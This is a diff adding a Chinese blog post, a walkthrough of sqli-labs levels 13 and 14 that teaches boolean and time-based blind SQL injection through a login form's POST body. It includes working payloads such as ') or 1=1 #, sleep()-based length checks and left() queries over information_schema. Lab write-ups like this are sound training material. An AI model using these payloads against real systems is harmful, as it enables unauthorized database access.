@@ -145,6 +145,77 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/13/article-title-8/" class="post-title-link" itemprop="url">sqli-labs练习(第十三、十四关)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-13 19:59:24 / 修改时间：21:36:37" itemprop="dateCreated datePublished" datetime="2020-12-13T19:59:24+08:00">2020-12-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>课前复习：</p>
+<p>left(var,1)函数：数据库名为security，则left(database(),1)=s，left(database(),2)=se，很容易理解的语句。</p>
+<h3 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h3><p>开始还是同样的方法，先抓包，再判断闭合符<code>&#39;)</code></p>
+<p><code>uname=adm&#39;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p>输入之后没有报错，但是与上一关不同，此关只会显示登入成功和失败，所以应该使用盲注。</p>
+<h4 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h4><p>构造if语句<code>uname=adm&#39;) or if(length(database())=8,1,sleep(5)) #&amp;passwd=admin&amp;submit=Submit</code>可以得知库名长度为8。</p>
+<p>也可以用left语句<code>uname=adm&#39;) or left(database(),1)=&#39;s&#39; #&amp;passwd=admin&amp;submit=Submit</code>返回也是导入成功，说明库名第一个字符是<code>s</code>，接着可以一个一个试出库名。</p>
+<h4 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h4><p><code>uname=adm&#39;) or left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1)=&#39;e&#39; #&amp;passwd=admin&amp;submit=Submit</code>就是一个简单的查表语句(记得加上括号)与limit函数的应用。</p>
+<p><code>uname=adm&#39;) or left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),6)=&#39;emails&#39; #&amp;passwd=admin&amp;submit=Submit</code>成功登入</p>
+<p>在数据库中是以表为单位，所以在得出第一个表为emails后，查询第二个表要将<code>limit 0,1</code>改为<code>limit 1,1</code></p>
+<p>……</p>
+<p>接着就是得出字段</p>
+<h3 id="十四关"><a href="#十四关" class="headerlink" title="十四关"></a>十四关</h3><p>与第十三关相同，把闭合符<code>‘)</code>改为<code>”</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -854,7 +925,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
